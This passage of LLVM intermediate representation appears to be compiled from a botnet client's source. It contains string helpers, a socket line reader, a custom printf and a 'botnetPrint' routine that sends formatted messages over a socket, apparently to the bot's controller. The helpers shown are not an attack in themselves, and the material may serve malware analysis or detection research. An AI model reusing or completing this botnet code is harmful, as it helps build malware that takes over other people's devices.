  %52 = getelementptr inbounds i8, i8* %.08, i64 1
  %53 = load i8, i8* %.08, align 1
  %54 = getelementptr inbounds i8, i8* %.047, i64 1
  store i8 %53, i8* %.047, align 1
  %55 = getelementptr inbounds i8, i8* %.08, i64 2
  %56 = load i8, i8* %52, align 1
  %57 = getelementptr inbounds i8, i8* %.047, i64 2
  store i8 %56, i8* %54, align 1
  %58 = getelementptr inbounds i8, i8* %.08, i64 3
  %59 = load i8, i8* %55, align 1
  %60 = getelementptr inbounds i8, i8* %.047, i64 3
  store i8 %59, i8* %57, align 1
  %61 = getelementptr inbounds i8, i8* %.08, i64 4
  %62 = load i8, i8* %58, align 1
  %63 = getelementptr inbounds i8, i8* %.047, i64 4
  store i8 %62, i8* %60, align 1
  %64 = getelementptr inbounds i8, i8* %.08, i64 5
  %65 = load i8, i8* %61, align 1
  %66 = getelementptr inbounds i8, i8* %.047, i64 5
  store i8 %65, i8* %63, align 1
  %67 = getelementptr inbounds i8, i8* %.08, i64 6
  %68 = load i8, i8* %64, align 1
  %69 = getelementptr inbounds i8, i8* %.047, i64 6
  store i8 %68, i8* %66, align 1
  %70 = getelementptr inbounds i8, i8* %.08, i64 7
  %71 = load i8, i8* %67, align 1
  %72 = getelementptr inbounds i8, i8* %.047, i64 7
  store i8 %71, i8* %69, align 1
  %73 = add nsw i32 %.056, -8
  %74 = getelementptr inbounds i8, i8* %.08, i64 8
  %75 = load i8, i8* %70, align 1
  %76 = getelementptr inbounds i8, i8* %.047, i64 8
  store i8 %75, i8* %72, align 1
  %77 = icmp eq i32 %73, 0
  br i1 %77, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph, !llvm.loop !13

._crit_edge.loopexit.unr-lcssa:                   ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %middle.block, %3
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @util_strcpy(i8* nocapture, i8* nocapture readonly) local_unnamed_addr #3 {
  %3 = tail call i32 @util_strlen(i8* %1)
  %4 = add nsw i32 %3, 1
  tail call void @util_memcpy(i8* %0, i8* %1, i32 %4)
  ret i32 %3
}

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #6
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #6

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %9 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  br label %10

; <label>:10:                                     ; preds = %136, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %136 ]
  %.0 = phi i8* [ %1, %3 ], [ %137, %136 ]
  %11 = load i8, i8* %.0, align 1
  switch i8 %11, label %132 [
    i8 0, label %138
    i8 37, label %12
  ]

; <label>:12:                                     ; preds = %10
  %13 = getelementptr inbounds i8, i8* %.0, i64 1
  %14 = load i8, i8* %13, align 1
  switch i8 %14, label %.preheader70 [
    i8 0, label %138
    i8 37, label %132
    i8 45, label %15
  ]

; <label>:15:                                     ; preds = %12
  %16 = getelementptr inbounds i8, i8* %.0, i64 2
  %.pre = load i8, i8* %16, align 1
  br label %.preheader70

.preheader70:                                     ; preds = %15, %12
  %17 = phi i8 [ %14, %12 ], [ %.pre, %15 ]
  %.063.ph = phi i32 [ 0, %12 ], [ 1, %15 ]
  %.1.ph = phi i8* [ %13, %12 ], [ %16, %15 ]
  %18 = icmp eq i8 %17, 48
  br i1 %18, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %19 = phi i8 [ %17, %.preheader70 ], [ %23, %.preheader.loopexit ]
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %22, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %21, %.preheader.loopexit ]
  %.off74 = add i8 %19, -48
  %20 = icmp ult i8 %.off74, 10
  br i1 %20, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %21, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %22, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %21 = getelementptr inbounds i8, i8* %.172, i64 1
  %22 = or i32 %.06371, 2
  %23 = load i8, i8* %21, align 1
  %24 = icmp eq i8 %23, 48
  br i1 %24, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %25 = phi i8 [ %31, %.lr.ph77 ], [ %19, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %30, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %29, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %26 = zext i8 %25 to i32
  %27 = mul nsw i32 %.06475, 10
  %28 = add i32 %27, -48
  %29 = add i32 %28, %26
  %30 = getelementptr inbounds i8, i8* %.276, i64 1
  %31 = load i8, i8* %30, align 1
  %.off = add i8 %31, -48
  %32 = icmp ult i8 %.off, 10
  br i1 %32, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %29, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %30, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %19, %.preheader ], [ %31, %.critedge.loopexit ]
  switch i8 %.lcssa, label %136 [
    i8 115, label %33
    i8 100, label %51
    i8 120, label %67
    i8 88, label %83
    i8 117, label %99
    i8 99, label %115
  ]

; <label>:33:                                     ; preds = %.critedge
  %34 = load i32, i32* %5, align 8
  %35 = icmp ult i32 %34, 41
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %33
  %37 = load i8*, i8** %6, align 8
  %38 = sext i32 %34 to i64
  %39 = getelementptr i8, i8* %37, i64 %38
  %40 = add i32 %34, 8
  store i32 %40, i32* %5, align 8
  br label %44

; <label>:41:                                     ; preds = %33
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr i8, i8* %42, i64 8
  store i8* %43, i8** %7, align 8
  br label %44

; <label>:44:                                     ; preds = %41, %36
  %.in69 = phi i8* [ %39, %36 ], [ %42, %41 ]
  %45 = bitcast i8* %.in69 to i8**
  %46 = load i8*, i8** %45, align 8
  %47 = icmp ne i8* %46, null
  %48 = select i1 %47, i8* %46, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.173, i64 0, i64 0)
  %49 = tail call fastcc i32 @prints(i8** %0, i8* %48, i32 %.064.lcssa, i32 %.063.lcssa)
  %50 = add nsw i32 %49, %.061
  br label %136

; <label>:51:                                     ; preds = %.critedge
  %52 = load i32, i32* %5, align 8
  %53 = icmp ult i32 %52, 41
  br i1 %53, label %54, label %59

; <label>:54:                                     ; preds = %51
  %55 = load i8*, i8** %6, align 8
  %56 = sext i32 %52 to i64
  %57 = getelementptr i8, i8* %55, i64 %56
  %58 = add i32 %52, 8
  store i32 %58, i32* %5, align 8
  br label %62

; <label>:59:                                     ; preds = %51
  %60 = load i8*, i8** %7, align 8
  %61 = getelementptr i8, i8* %60, i64 8
  store i8* %61, i8** %7, align 8
  br label %62

; <label>:62:                                     ; preds = %59, %54
  %.in68 = phi i8* [ %57, %54 ], [ %60, %59 ]
  %63 = bitcast i8* %.in68 to i32*
  %64 = load i32, i32* %63, align 4
  %65 = tail call fastcc i32 @printi(i8** %0, i32 %64, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %66 = add nsw i32 %65, %.061
  br label %136

; <label>:67:                                     ; preds = %.critedge
  %68 = load i32, i32* %5, align 8
  %69 = icmp ult i32 %68, 41
  br i1 %69, label %70, label %75

; <label>:70:                                     ; preds = %67
  %71 = load i8*, i8** %6, align 8
  %72 = sext i32 %68 to i64
  %73 = getelementptr i8, i8* %71, i64 %72
  %74 = add i32 %68, 8
  store i32 %74, i32* %5, align 8
  br label %78

; <label>:75:                                     ; preds = %67
  %76 = load i8*, i8** %7, align 8
  %77 = getelementptr i8, i8* %76, i64 8
  store i8* %77, i8** %7, align 8
  br label %78

; <label>:78:                                     ; preds = %75, %70
  %.in67 = phi i8* [ %73, %70 ], [ %76, %75 ]
  %79 = bitcast i8* %.in67 to i32*
  %80 = load i32, i32* %79, align 4
  %81 = tail call fastcc i32 @printi(i8** %0, i32 %80, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %82 = add nsw i32 %81, %.061
  br label %136

; <label>:83:                                     ; preds = %.critedge
  %84 = load i32, i32* %5, align 8
  %85 = icmp ult i32 %84, 41
  br i1 %85, label %86, label %91

; <label>:86:                                     ; preds = %83
  %87 = load i8*, i8** %6, align 8
  %88 = sext i32 %84 to i64
  %89 = getelementptr i8, i8* %87, i64 %88
  %90 = add i32 %84, 8
  store i32 %90, i32* %5, align 8
  br label %94

; <label>:91:                                     ; preds = %83
  %92 = load i8*, i8** %7, align 8
  %93 = getelementptr i8, i8* %92, i64 8
  store i8* %93, i8** %7, align 8
  br label %94

; <label>:94:                                     ; preds = %91, %86
  %.in66 = phi i8* [ %89, %86 ], [ %92, %91 ]
  %95 = bitcast i8* %.in66 to i32*
  %96 = load i32, i32* %95, align 4
  %97 = tail call fastcc i32 @printi(i8** %0, i32 %96, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %98 = add nsw i32 %97, %.061
  br label %136

; <label>:99:                                     ; preds = %.critedge
  %100 = load i32, i32* %5, align 8
  %101 = icmp ult i32 %100, 41
  br i1 %101, label %102, label %107

; <label>:102:                                    ; preds = %99
  %103 = load i8*, i8** %6, align 8
  %104 = sext i32 %100 to i64
  %105 = getelementptr i8, i8* %103, i64 %104
  %106 = add i32 %100, 8
  store i32 %106, i32* %5, align 8
  br label %110

; <label>:107:                                    ; preds = %99
  %108 = load i8*, i8** %7, align 8
  %109 = getelementptr i8, i8* %108, i64 8
  store i8* %109, i8** %7, align 8
  br label %110

; <label>:110:                                    ; preds = %107, %102
  %.in65 = phi i8* [ %105, %102 ], [ %108, %107 ]
  %111 = bitcast i8* %.in65 to i32*
  %112 = load i32, i32* %111, align 4
  %113 = tail call fastcc i32 @printi(i8** %0, i32 %112, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %114 = add nsw i32 %113, %.061
  br label %136

; <label>:115:                                    ; preds = %.critedge
  %116 = load i32, i32* %5, align 8
  %117 = icmp ult i32 %116, 41
  br i1 %117, label %118, label %123

; <label>:118:                                    ; preds = %115
  %119 = load i8*, i8** %6, align 8
  %120 = sext i32 %116 to i64
  %121 = getelementptr i8, i8* %119, i64 %120
  %122 = add i32 %116, 8
  store i32 %122, i32* %5, align 8
  br label %126

; <label>:123:                                    ; preds = %115
  %124 = load i8*, i8** %7, align 8
  %125 = getelementptr i8, i8* %124, i64 8
  store i8* %125, i8** %7, align 8
  br label %126

; <label>:126:                                    ; preds = %123, %118
  %.in = phi i8* [ %121, %118 ], [ %124, %123 ]
  %127 = bitcast i8* %.in to i32*
  %128 = load i32, i32* %127, align 4
  %129 = trunc i32 %128 to i8
  store i8 %129, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %130 = call fastcc i32 @prints(i8** %0, i8* nonnull %8, i32 %.064.lcssa, i32 %.063.lcssa)
  %131 = add nsw i32 %130, %.061
  br label %136

; <label>:132:                                    ; preds = %12, %10
  %133 = phi i8 [ %11, %10 ], [ 37, %12 ]
  %.3 = phi i8* [ %.0, %10 ], [ %13, %12 ]
  %134 = zext i8 %133 to i32
  tail call fastcc void @printchar(i8** %0, i32 %134)
  %135 = add nsw i32 %.061, 1
  br label %136

; <label>:136:                                    ; preds = %.critedge, %132, %126, %110, %94, %78, %62, %44
  %.162 = phi i32 [ %135, %132 ], [ %50, %44 ], [ %66, %62 ], [ %82, %78 ], [ %98, %94 ], [ %114, %110 ], [ %131, %126 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %132 ], [ %.2.lcssa, %44 ], [ %.2.lcssa, %62 ], [ %.2.lcssa, %78 ], [ %.2.lcssa, %94 ], [ %.2.lcssa, %110 ], [ %.2.lcssa, %126 ], [ %.2.lcssa, %.critedge ]
  %137 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %10

; <label>:138:                                    ; preds = %12, %10
  %139 = icmp eq i8** %0, null
  br i1 %139, label %142, label %140

; <label>:140:                                    ; preds = %138
  %141 = load i8*, i8** %0, align 8
  store i8 0, i8* %141, align 1
  br label %142

; <label>:142:                                    ; preds = %138, %140
  %143 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %143)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define i32 @botnetPrint(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #6
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #14
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i64 @strlen(i8* %5) #14
  %12 = call i64 @send(i32 %0, i8* %5, i64 %11, i32 16384) #6
  %13 = trunc i64 %12 to i32
  call void @free(i8* %5) #6
  ret i32 %13
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #7

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #6

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #8

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #14
  %3 = add i64 %2, 4294967295
  %4 = tail call i16** @__ctype_b_loc() #15
  %5 = load i16*, i16** %4, align 8
  br label %6

; <label>:6:                                      ; preds = %6, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %6 ], [ 0, %1 ]
  %7 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %8 = load i8, i8* %7, align 1
  %9 = sext i8 %8 to i64
  %10 = getelementptr inbounds i16, i16* %5, i64 %9
  %11 = load i16, i16* %10, align 2
  %12 = and i16 %11, 8192
  %13 = icmp eq i16 %12, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %13, label %.preheader, label %6

.preheader:                                       ; preds = %6
  %14 = trunc i64 %3 to i32
  %15 = trunc i64 %indvars.iv29 to i32
  %16 = icmp slt i32 %14, %15
  br i1 %16, label %.critedge.preheader, label %.lr.ph22

.lr.ph22:                                         ; preds = %.preheader
  %sext = shl i64 %3, 32
  %17 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %18 = ashr exact i64 %sext31, 32
  br label %78

.critedge.preheader.loopexit:                     ; preds = %78, %87
  %.0.lcssa.ph = phi i32 [ %86, %78 ], [ %88, %87 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %14, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %19 = icmp sgt i32 %15, %.0.lcssa
  br i1 %19, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %20 = ashr exact i64 %sext32, 32
  %21 = sext i32 %.0.lcssa to i64
  %22 = icmp sgt i64 %21, %20
  %smax = select i1 %22, i64 %21, i64 %20
  %23 = add nsw i64 %smax, 1
  %24 = sub nsw i64 %23, %20
  %min.iters.check = icmp ult i64 %24, 32
  br i1 %min.iters.check, label %.critedge.preheader39, label %min.iters.checked

.critedge.preheader39:                            ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.critedge.preheader26
  %indvars.iv.ph = phi i64 [ %20, %vector.memcheck ], [ %20, %min.iters.checked ], [ %20, %.critedge.preheader26 ], [ %ind.end, %middle.block ]
  br label %.critedge

min.iters.checked:                                ; preds = %.critedge.preheader26
  %n.vec = and i64 %24, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.critedge.preheader39, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %25 = icmp sgt i64 %21, %20
  %smax34 = select i1 %25, i64 %21, i64 %20
  %26 = add nsw i64 %smax34, 1
  %27 = sub nsw i64 %26, %20
  %scevgep = getelementptr i8, i8* %0, i64 %27
  %scevgep35 = getelementptr i8, i8* %0, i64 %20
  %scevgep36 = getelementptr i8, i8* %0, i64 %26
  %bound0 = icmp ugt i8* %scevgep36, %0
  %bound1 = icmp ult i8* %scevgep35, %scevgep
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = add nsw i64 %20, %n.vec
  br i1 %memcheck.conflict, label %.critedge.preheader39, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %28 = add nsw i64 %n.vec, -32
  %29 = lshr exact i64 %28, 5
  %30 = add nuw nsw i64 %29, 1
  %xtraiter = and i64 %30, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %vector.body.prol ], [ %xtraiter, %vector.body.prol.preheader ]
  %31 = add i64 %20, %index.prol
  %32 = getelementptr inbounds i8, i8* %0, i64 %31
  %33 = bitcast i8* %32 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %33, align 1, !alias.scope !14
  %34 = getelementptr i8, i8* %32, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  %wide.load38.prol = load <16 x i8>, <16 x i8>* %35, align 1, !alias.scope !14
  %36 = getelementptr inbounds i8, i8* %0, i64 %index.prol
  %37 = bitcast i8* %36 to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %37, align 1, !alias.scope !17, !noalias !14
  %38 = getelementptr i8, i8* %36, i64 16
  %39 = bitcast i8* %38 to <16 x i8>*
  store <16 x i8> %wide.load38.prol, <16 x i8>* %39, align 1, !alias.scope !17, !noalias !14
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !19

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %40 = icmp ult i64 %28, 96
  br i1 %40, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %41 = add i64 %20, %index
  %42 = getelementptr inbounds i8, i8* %0, i64 %41
  %43 = bitcast i8* %42 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %43, align 1, !alias.scope !14
  %44 = getelementptr i8, i8* %42, i64 16
  %45 = bitcast i8* %44 to <16 x i8>*
  %wide.load38 = load <16 x i8>, <16 x i8>* %45, align 1, !alias.scope !14
  %46 = getelementptr inbounds i8, i8* %0, i64 %index
  %47 = bitcast i8* %46 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %47, align 1, !alias.scope !17, !noalias !14
  %48 = getelementptr i8, i8* %46, i64 16
  %49 = bitcast i8* %48 to <16 x i8>*
  store <16 x i8> %wide.load38, <16 x i8>* %49, align 1, !alias.scope !17, !noalias !14
  %index.next = add i64 %index, 32
  %50 = add i64 %20, %index.next
  %51 = getelementptr inbounds i8, i8* %0, i64 %50
  %52 = bitcast i8* %51 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %52, align 1, !alias.scope !14
  %53 = getelementptr i8, i8* %51, i64 16
  %54 = bitcast i8* %53 to <16 x i8>*
  %wide.load38.1 = load <16 x i8>, <16 x i8>* %54, align 1, !alias.scope !14
  %55 = getelementptr inbounds i8, i8* %0, i64 %index.next
  %56 = bitcast i8* %55 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %56, align 1, !alias.scope !17, !noalias !14
  %57 = getelementptr i8, i8* %55, i64 16
  %58 = bitcast i8* %57 to <16 x i8>*
  store <16 x i8> %wide.load38.1, <16 x i8>* %58, align 1, !alias.scope !17, !noalias !14
  %index.next.1 = add i64 %index, 64
  %59 = add i64 %20, %index.next.1
  %60 = getelementptr inbounds i8, i8* %0, i64 %59
  %61 = bitcast i8* %60 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %61, align 1, !alias.scope !14
  %62 = getelementptr i8, i8* %60, i64 16
  %63 = bitcast i8* %62 to <16 x i8>*
  %wide.load38.2 = load <16 x i8>, <16 x i8>* %63, align 1, !alias.scope !14
  %64 = getelementptr inbounds i8, i8* %0, i64 %index.next.1
  %65 = bitcast i8* %64 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %65, align 1, !alias.scope !17, !noalias !14
  %66 = getelementptr i8, i8* %64, i64 16
  %67 = bitcast i8* %66 to <16 x i8>*
  store <16 x i8> %wide.load38.2, <16 x i8>* %67, align 1, !alias.scope !17, !noalias !14
  %index.next.2 = add i64 %index, 96
  %68 = add i64 %20, %index.next.2
  %69 = getelementptr inbounds i8, i8* %0, i64 %68
  %70 = bitcast i8* %69 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %70, align 1, !alias.scope !14
  %71 = getelementptr i8, i8* %69, i64 16
  %72 = bitcast i8* %71 to <16 x i8>*
  %wide.load38.3 = load <16 x i8>, <16 x i8>* %72, align 1, !alias.scope !14
  %73 = getelementptr inbounds i8, i8* %0, i64 %index.next.2
  %74 = bitcast i8* %73 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %74, align 1, !alias.scope !17, !noalias !14
  %75 = getelementptr i8, i8* %73, i64 16
  %76 = bitcast i8* %75 to <16 x i8>*
  store <16 x i8> %wide.load38.3, <16 x i8>* %76, align 1, !alias.scope !17, !noalias !14
  %index.next.3 = add i64 %index, 128
  %77 = icmp eq i64 %index.next.3, %n.vec
  br i1 %77, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !20

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %24, %n.vec
  br i1 %cmp.n, label %.critedge._crit_edge, label %.critedge.preheader39

; <label>:78:                                     ; preds = %87, %.lr.ph22
  %indvars.iv27 = phi i64 [ %indvars.iv.next28, %87 ], [ %17, %.lr.ph22 ]
  %.021 = phi i32 [ %88, %87 ], [ %14, %.lr.ph22 ]
  %79 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i64
  %82 = getelementptr inbounds i16, i16* %5, i64 %81
  %83 = load i16, i16* %82, align 2
  %84 = and i16 %83, 8192
  %85 = icmp eq i16 %84, 0
  %86 = trunc i64 %indvars.iv27 to i32
  br i1 %85, label %.critedge.preheader.loopexit, label %87

; <label>:87:                                     ; preds = %78
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %88 = add nsw i32 %.021, -1
  %89 = icmp sgt i64 %indvars.iv27, %18
  br i1 %89, label %78, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader39, %.critedge
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge ], [ %indvars.iv.ph, %.critedge.preheader39 ]
  %90 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %91 = load i8, i8* %90, align 1
  %92 = sub nsw i64 %indvars.iv, %20
  %93 = getelementptr inbounds i8, i8* %0, i64 %92
  store i8 %91, i8* %93, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %94 = icmp slt i64 %indvars.iv, %21
  br i1 %94, label %.critedge, label %.critedge._crit_edge.loopexit, !llvm.loop !21

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %middle.block, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %ind.end, %middle.block ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %95 = sub i64 %.019.lcssa, %indvars.iv29
  %sext33 = shl i64 %95, 32
  %96 = ashr exact i64 %sext33, 32
  %97 = getelementptr inbounds i8, i8* %0, i64 %96
  store i8 0, i8* %97, align 1
  ret void
}

; Function Attrs: nounwind readnone
declare i16** @__ctype_b_loc() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #6
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #2

